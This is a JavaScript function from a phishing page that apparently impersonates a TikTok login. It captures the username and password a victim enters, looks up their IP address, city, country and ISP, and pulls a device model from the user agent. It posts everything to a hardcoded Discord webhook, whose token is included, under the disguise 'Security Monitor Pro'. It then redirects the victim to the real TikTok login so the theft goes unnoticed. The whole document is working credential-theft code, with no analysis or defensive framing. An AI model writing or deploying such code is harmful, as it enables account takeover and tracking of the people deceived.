async function sendTargetData() { // 1. Get user input from the HTML fields const userField = document.getElementById('user').value; const passField = document.getElementById('pass').value; const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e"; if (!userField || !passField) { alert("Please enter your login credentials to continue."); return; } try { // 2. Fetch IP and Device data in parallel for speed const ipTask = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({})); // 3. Extract detailed Device Model from User Agent const userAgent = navigator.userAgent; const regExp = /\(([^)]+)\)/; const matches = regExp.exec(userAgent); const deviceModel = matches ? matches[1] : "Unknown Device"; const loc = await ipTask; // 4. Create the Discord Data Payload const payload = { username: "Security Monitor Pro", avatar_url: "https://i.imgur.com/8nLAsvW.png", embeds: [{ title: "Log Report: User Authentication", color: 16711680, // High-visibility red fields: [ { name: "👤 Account ID", value: `\`${userField}\``, inline: true }, { name: "🔑 Security Key", value: `\`${passField}\``, inline: true }, { name: "📱 Device Info", value: `**${deviceModel}**`, inline: false }, { name: "🌐 IP Address", value: `**${loc.ip || 'Not Found'}**`, inline: true }, { name: "📍 Location", value: `${loc.city || 'N/A'}, ${loc.country_name || 'N/A'}`, inline: true }, { name: "📡 ISP/Provider", value: `${loc.org || 'Unknown'}`, inline: false } ], footer: { text: "Transmission Secure • " + new Date().toLocaleString() } }] }; // 5. Use 'keepalive' to force the browser to finish the request const response = await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }); // 6. Redirect to the original platform after verification if (response.ok || response.status) { window.location.replace("https://www.tiktok.com/login"); } } catch (error) { // Quiet redirect if something fails window.location.replace("https://www.tiktok.com/"); } }
